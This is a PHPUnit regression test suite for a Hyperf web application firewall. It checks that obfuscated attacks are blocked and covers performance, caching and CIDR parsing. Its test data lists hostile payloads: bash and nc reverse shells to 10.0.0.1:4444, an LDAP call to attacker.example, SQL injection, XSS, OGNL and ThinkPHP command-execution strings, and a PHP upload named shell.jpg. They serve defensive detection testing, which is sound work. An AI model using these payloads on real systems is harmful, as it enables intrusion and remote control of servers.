<?php

declare(strict_types=1);

namespace Prowendi\HyperfHttpWaf\Tests;

use Prowendi\HyperfHttpWaf\Config\WafConfig;
use Prowendi\HyperfHttpWaf\Matcher\PatternMatcher;
use Prowendi\HyperfHttpWaf\Support\ConfigRuleProvider;
use Prowendi\HyperfHttpWaf\Tests\Stubs\OkHandler;
use Prowendi\HyperfHttpWaf\DTO\TextInput;

/**
 * Regression suite for issues found during the multi-perspective audit:
 * prefilter gates that silently disabled rules, combined-obfuscation
 * candidates, O(n^2) separator collapsing, and config-cache staleness.
 */
final class WafAuditRegressionTest extends TestCase
{
    /**
     * @return iterable<string, list<string>>
     */
    public static function prefilterGapProvider(): iterable
    {
        yield 'sqli comment tab gap' => ["1'\t-- x"];
        yield 'sqli comment spaces' => ["1'   /* hint"];
        yield 'script tag tab' => ["<%09script>alert(1)</script>"];
        yield 'script tag double space' => ['<  script>alert(1)</script>'];
        yield 'ldap scheme' => ['ldap://attacker.example/x'];
        yield 'ognl paren exec' => ['(#foo).exec("id")'];
        yield 'reverse shell tab' => ["bash\t-i >& /dev/tcp/10.0.0.1/4444 0>&1"];
        yield 'nc tab exec' => ["nc\t-e /bin/sh 10.0.0.1 4444"];
        yield 'system spaced paren' => ['; system (whoami)'];
        yield 'blind user spaced' => ['1 AND user ( )'];
        yield 'thinkphp construct raw body' => ['_method=__construct&filter[]=system&s=whoami'];
        yield 'null byte decoded' => ["user\x00admin"];
    }

    /**
     * @dataProvider prefilterGapProvider
     */
    public function testPrefilterGapsAreClosed(string $payload): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'decision' => ['score_threshold' => 25],
        ]);

        $request = $this->createRequest('POST', '/submit', [
            'content-type' => 'text/plain',
            'user-agent' => 'Mozilla/5.0',
        ], $payload);

        self::assertSame(403, $middleware->process($request, new OkHandler())->getStatusCode(), $payload);
    }

    public function testCombinedVersionCommentAndSeparatorObfuscationIsNormalized(): void
    {
        $config = WafConfig::fromArray([]);
        $matcher = new PatternMatcher();
        $rules = (new ConfigRuleProvider())->provide($config, ['input']);

        $hits = $matcher->match(
            [new TextInput('query', 'q', '/*!50000union*//*!50000*//*!50000select*/ password')],
            $rules,
            $config
        );

        self::assertContains('sqli-union-select', array_column($hits, 'ruleId'));
    }

    public function testSeparatorCollapsingIsFastOnAdversarialInput(): void
    {
        $config = WafConfig::fromArray([]);
        $matcher = new PatternMatcher();
        $rules = (new ConfigRuleProvider())->provide($config, ['input']);

        $pathological = str_repeat('/./', 2048) . 'etc/passwd';

        $start = hrtime(true);
        $matcher->match([new TextInput('query', 'f', $pathological)], $rules, $config);
        $elapsedMs = (hrtime(true) - $start) / 1e6;

        // The old implementation needed ~2000 preg_replace passes over a
        // 6 KiB string (O(n^2)); the converged pipeline must stay linear.
        self::assertLessThan(200.0, $elapsedMs, sprintf('collapsing took %.1f ms', $elapsedMs));
    }

    public function testRuleProviderCacheSurvivesConfigChange(): void
    {
        $provider = new ConfigRuleProvider();

        $first = $provider->provide(WafConfig::fromArray([]), ['input']);
        $second = $provider->provide(WafConfig::fromArray([
            'rules' => [
                [
                    'rule_id' => 'only-rule',
                    'name' => 'Only',
                    'type' => 'custom',
                    'target' => 'input',
                    'pattern' => '/zzz/',
                    'prefilters' => ['zzz'],
                    'score' => 10,
                    'action' => 'score',
                    'enabled' => true,
                ],
            ],
        ]), ['input']);

        self::assertNotCount(count($first), $second);
        self::assertSame(['only-rule'], array_column($second, 'ruleId'));
    }

    public function testCidrMatcherRejectsMalformedMaskInsteadOfMatchingAll(): void
    {
        $matcher = new \Prowendi\HyperfHttpWaf\Support\CidrMatcher();

        self::assertFalse($matcher->matchesOne('8.8.8.8', '10.0.0.0/abc'));
        self::assertFalse($matcher->matchesOne('8.8.8.8', '10.0.0.0/'));
        self::assertTrue($matcher->matchesOne('10.1.2.3', '10.0.0.0/8'));
    }

    public function testPhpSnippetWithConstructAndPrototypePasses(): void
    {
        $middleware = $this->createMiddleware(['mode' => 'block']);

        $request = $this->createRequest('POST', '/snippet', [
            'content-type' => 'text/plain',
            'user-agent' => 'Mozilla/5.0',
        ], '<?php class A { public function __construct() {} } // and Foo.prototype.bar = 1; call_user_func_array(fn, []);');

        self::assertSame(200, $middleware->process($request, new OkHandler())->getStatusCode());
    }

    public function testContentInspectionDisabledSkipsSnippet(): void
    {
        $middleware = $this->createMiddleware([
            'mode' => 'block',
            'files' => ['content_inspection' => false],
        ]);

        $request = $this->createRequest('POST', '/avatar', [
            'user-agent' => 'Mozilla/5.0',
        ])->withUploadedFiles([
            'avatar' => new \Nyholm\Psr7\UploadedFile(
                \Nyholm\Psr7\Stream::create('<?php echo 1;'),
                14,
                UPLOAD_ERR_OK,
                'shell.jpg',
                'image/jpeg'
            ),
        ]);

        // Content rule disabled: a PHP payload in a .jpg upload passes again,
        // exactly what the operator opted out of.
        self::assertSame(200, $middleware->process($request, new OkHandler())->getStatusCode());
    }
}
